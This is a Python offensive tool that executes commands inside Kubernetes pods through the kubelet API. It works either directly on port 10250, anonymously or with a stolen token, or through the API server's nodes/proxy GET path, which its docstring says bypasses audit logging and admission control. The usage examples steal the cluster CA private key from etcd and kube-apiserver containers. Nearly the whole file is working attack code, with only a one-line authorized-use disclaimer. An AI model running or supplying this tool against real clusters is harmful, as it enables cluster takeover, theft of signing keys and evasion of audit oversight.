#!/usr/bin/env python3
"""kubelet_exec.py - Execute commands in pods via the kubelet API or the nodes/proxy GET path.

Covers two offensive primitives:
  1. Direct kubelet API on :10250 (anonymous if --anonymous-auth=true, or with a stolen node/SA token).
     Endpoints: /pods (enumerate), /run/<ns>/<pod>/<container> (one-shot exec).
  2. nodes/proxy GET -> kubelet WebSocket exec (Helton, 2026; "working as intended", no CVE):
     proxied through the API server, authorized only on the GET verb, BYPASSING API audit & admission.

USAGE:
  # enumerate pods on a node's kubelet
  python3 kubelet_exec.py --node 10.0.0.5 --list [--token "$TOK"]
  # direct kubelet exec
  python3 kubelet_exec.py --node 10.0.0.5 --pod kube-system/etcd-master --container etcd \
          --cmd 'cat /etc/kubernetes/pki/ca.key' [--token "$TOK"]
  # via API-server proxy using nodes/proxy GET
  python3 kubelet_exec.py --apiserver https://API:6443 --token "$SA_TOKEN" --via-proxy \
          --node node1 --pod kube-system/kube-apiserver-node1 --container kube-apiserver \
          --cmd 'cat /etc/kubernetes/pki/ca.key'

Dependencies: Python 3.6+ stdlib (urllib/ssl). --insecure skips TLS verify for self-signed cluster
certs (opt-in; default verifies, loading the in-pod CA when present). Authorized engagements only.
"""
import argparse
import json
import os
import ssl
import sys
import urllib.parse
import urllib.request

SA_CA = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"


def make_ctx(insecure):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    elif os.path.exists(SA_CA):
        ctx.load_verify_locations(SA_CA)
    return ctx


def http(url, ctx, token=None, method="GET", data=None):
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, headers=headers, method=method,
                                 data=data.encode() if isinstance(data, str) else data)
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, str(e)


def list_pods(node, token, ctx):
    url = f"https://{node}:10250/pods"
    code, body = http(url, ctx, token)
    if code != 200:
        print(f"[!] /pods returned {code}: {body[:200]}")
        return
    try:
        data = json.loads(body)
    except Exception:
        print(body[:500]); return
    print(f"[*] Pods on kubelet {node}:")
    for it in data.get("items", []):
        md = it.get("metadata", {})
        ns, name = md.get("namespace", "?"), md.get("name", "?")
        for c in it.get("spec", {}).get("containers", []):
            print(f"    {ns}/{name}  container={c.get('name')}")


def kubelet_exec(node, ns, pod, container, cmd, token, ctx):
    # The /run endpoint runs a single command and returns combined output.
    path = f"/run/{ns}/{pod}/{container}"
    url = f"https://{node}:10250{path}"
    data = urllib.parse.urlencode({"cmd": cmd})
    print(f"[*] POST {url}  cmd={cmd!r}")
    code, body = http(url, ctx, token, method="POST", data=data)
    print(f"[*] status={code}")
    print(body)


def proxy_exec(apiserver, node, ns, pod, container, cmd, token, ctx):
    # nodes/proxy GET path: the kubelet authorizes on the GET verb (KEP-2862 pre-v1.33), so a
    # nodes/proxy GET principal can reach /run without the create verb. /run accepts query cmds.
    qs = "&".join(f"cmd={urllib.parse.quote(p)}" for p in cmd.split())
    path = f"/api/v1/nodes/{node}/proxy/run/{ns}/{pod}/{container}?{qs}"
    url = apiserver.rstrip("/") + path
    print(f"[*] GET (via API proxy / nodes-proxy) {url}")
    print("    NOTE: this path bypasses API-server audit logging and admission control.")
    code, body = http(url, ctx, token, method="GET")
    if code in (None, 404, 405):
        # fall back to a raw GET against the same proxied path with POST semantics
        code, body = http(url, ctx, token, method="POST")
    print(f"[*] status={code}")
    print(body)


def main():
    ap = argparse.ArgumentParser(description="Kubelet API / nodes-proxy pod exec")
    ap.add_argument("--node", required=True, help="kubelet host (direct) or node name (--via-proxy)")
    ap.add_argument("--apiserver", help="API server URL (required for --via-proxy)")
    ap.add_argument("--via-proxy", action="store_true", help="use nodes/proxy GET via the API server")
    ap.add_argument("--pod", help="<namespace>/<pod>")
    ap.add_argument("--container", help="container name")
    ap.add_argument("--cmd", help="command to run")
    ap.add_argument("--list", action="store_true", help="enumerate pods on the kubelet")
    ap.add_argument("--token", help="bearer token (node/SA); omit for anonymous kubelet")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verify (self-signed cluster certs)")
    args = ap.parse_args()

    ctx = make_ctx(args.insecure)

    if args.list:
        list_pods(args.node, args.token, ctx)
        return 0

    if not (args.pod and args.container and args.cmd):
        ap.error("--pod, --container, and --cmd are required (or use --list)")
    ns, pod = args.pod.split("/", 1)

    if args.via_proxy:
        if not args.apiserver:
            ap.error("--via-proxy requires --apiserver")
        proxy_exec(args.apiserver, args.node, ns, pod, args.container, args.cmd, args.token, ctx)
    else:
        kubelet_exec(args.node, ns, pod, args.container, args.cmd, args.token, ctx)
    return 0


if __name__ == "__main__":
    sys.exit(main())
